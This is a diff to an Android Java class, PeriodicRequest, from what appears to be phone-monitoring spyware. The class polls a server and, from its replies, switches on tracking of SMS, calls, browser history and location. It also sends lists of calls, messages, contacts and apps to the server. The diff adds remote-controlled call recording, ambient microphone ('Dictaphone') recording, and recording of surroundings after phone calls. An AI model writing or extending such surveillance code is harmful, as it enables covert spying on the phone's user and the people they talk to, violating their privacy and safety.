@@ -12,7 +12,7 @@ import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 
 import com.inet.android.bs.ServiceControl;
-import com.inet.android.info.GetInfo;
+import com.inet.android.info.DeviceInformation;
 import com.inet.android.list.TurnSendList;
 import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.Logging;
@@ -67,7 +67,7 @@ public class PeriodicRequest extends DefaultRequest {
 				.getDefaultSharedPreferences(ctx);
 		try {
 			str = Caller.doMake(null, sp.getString("access_second_token", ""),
-					ConstantRequest.PERIODIC_LINK, true, null, ctx);
+					ConstantValue.PERIODIC_LINK, true, null, ctx);
 		} catch (IOException e) {
 			e.printStackTrace();
 			Logging.doLog(LOG_TAG, "IOException e PeriodicRequest",
@@ -77,7 +77,7 @@ public class PeriodicRequest extends DefaultRequest {
 			getRequestData(str);
 		else {
 			ParseToError.setError(str, null,
-					ConstantRequest.TYPE_PERIODIC_REQUEST, -1, null, null, ctx);
+					ConstantValue.TYPE_PERIODIC_REQUEST, -1, null, -1, ctx);
 			Logging.doLog(LOG_TAG, "ответа от сервера нет",
 					"ответа от сервера нет");
 
@@ -140,15 +140,16 @@ public class PeriodicRequest extends DefaultRequest {
 
 		// -----------active mode-----------------
 		if (str.equals("2")) {
-			if (sp.getBoolean("getInfo", false) == true) {
-				GetInfo getInfo = new GetInfo(ctx);
-				getInfo.startGetInfo();
+			if (sp.getBoolean("is_info", false) == true) {
+				DeviceInformation device = new DeviceInformation(ctx);
+				device.getInfo();
 				ServiceControl.runService(ctx);
-				ed.putBoolean("getInfo", false);
+				ed.putBoolean("is_info", false);
 			}
 			ed.putString("period", "1");
 			ed.commit();
 		}
+
 		// ----------frequency location------------
 		try {
 			str = jsonObject.getString("geo");
@@ -160,6 +161,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo", "0");
 		}
+
 		// -----------positioning mode----------------
 		try {
 			str = jsonObject.getString("geo_mode");
@@ -171,6 +173,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo_mode", "1");
 		}
+
 		// -----------monitoring sms----------------
 		try {
 			str = jsonObject.getString("sms");
@@ -183,6 +186,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("sms", "0");
 		}
+
 		// ------------monitoring of calls--------------
 		try {
 			str = jsonObject.getString("call");
@@ -194,6 +198,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("call", "0");
 		}
+
 		// ----------monitoring browser history-----------
 		try {
 			str = jsonObject.getString("www");
@@ -206,16 +211,52 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("www", "0");
 		}
 
-		// ----------record call-----------
+		// ----------key for record-----------
 		try {
-			str = jsonObject.getString("recall");
+			str = jsonObject.getString("key_rec");
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null) {
-			ed.putString("recall", str);
+			ed.putString("key_rec", str);
 		} else {
-			ed.putString("recall", "0");
+			ed.putString("key_rec", "0");
+		}
+
+		// ----------the number of minutes of Dictaphone-----------
+		try {
+			str = jsonObject.getString("rec_env");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("rec_env", str);
+		} else {
+			ed.putString("rec_env", "0");
+		}
+
+		// ----------record call-----------
+		try {
+			str = jsonObject.getString("rec_call");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("rec_call", str);
+		} else {
+			ed.putString("rec_call", "0");
+		}
+
+		// --recording situation after a telephone conversation-------
+		try {
+			str = jsonObject.getString("rec_env_call");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("rec_env_call", str);
+		} else {
+			ed.putString("rec_env_call", "0");
 		}
 
 		// ----------time server-----------
@@ -277,6 +318,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("brk_to", "");
 		}
+
 		// ----------------image and audio detect----------------------
 		String image = null;
 		String audio = null;
@@ -288,10 +330,11 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (image != null && audio != null) {
 
-			ed.putString("image_state", image);
-			ed.putString("audio_state", audio);
+			ed.putString("image", image);
+			ed.putString("audio", audio);
 
 		}
+
 		// ----------------method of sending files----------------------
 		try {
 			str = jsonObject.getString("dispatch");
@@ -304,17 +347,18 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("dispatch", str);
 
 		// ---------------calls list------------------------
-
 		try {
 			str = jsonObject.getString("calls_list");
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null)
-			if (!str.equals("0") && !sp.getString("list_call", "0").equals(str)) {
-				TurnSendList.setList(ConstantRequest.TYPE_LIST_CALL_REQUEST,
-						str, null, ctx);
+			if (!str.equals("0")
+					&& sp.getInt("list_call", 0) != Integer.parseInt(str)) {
+				TurnSendList.setList(ConstantValue.TYPE_LIST_CALL,
+						Integer.parseInt(str), null, ctx);
 			}
+
 		// ---------------sms list------------------------
 		try {
 			str = jsonObject.getString("sms_list");
@@ -322,13 +366,13 @@ public class PeriodicRequest extends DefaultRequest {
 			str = null;
 		}
 		if (str != null)
-			if (!str.equals("0") && !sp.getString("list_sms", "0").equals(str)) {
-				TurnSendList.setList(ConstantRequest.TYPE_LIST_SMS_REQUEST,
-						str, null, ctx);
+			if (!str.equals("0")
+					&& sp.getInt("list_sms", 0) != Integer.parseInt(str)) {
+				TurnSendList.setList(ConstantValue.TYPE_LIST_SMS,
+						Integer.parseInt(str), null, ctx);
 			}
 
 		// ---------------contacts list------------------------
-
 		try {
 			str = jsonObject.getString("contacts_list");
 		} catch (JSONException e) {
@@ -336,24 +380,23 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null)
 			if (!str.equals("0")
-					&& !sp.getString("list_contact", "0").equals(str)) {
-				TurnSendList.setList(
-						ConstantRequest.TYPE_LIST_CONTACTS_REQUEST, str, null,
-						ctx);
+					&& sp.getInt("list_contact", 0) != Integer.parseInt(str)) {
+				TurnSendList.setList(ConstantValue.TYPE_LIST_CONTACTS,
+						Integer.parseInt(str), null, ctx);
 			}
-		// ---------------apps list------------------------
 
+		// ---------------apps list------------------------
 		try {
 			str = jsonObject.getString("apps_list");
 		} catch (JSONException e) {
 			str = null;
 		}
 		if (str != null)
-			if (!str.equals("0") && !sp.getString("list_app", "0").equals(str)) {
-				TurnSendList.setList(ConstantRequest.TYPE_LIST_APP_REQUEST,
-						str, null, ctx);
+			if (!str.equals("0")
+					&& sp.getInt("list_app", 0) != Integer.parseInt(str)) {
+				TurnSendList.setList(ConstantValue.TYPE_LIST_APP,
+						Integer.parseInt(str), null, ctx);
 			}
-
 		ed.commit();
 	}
 
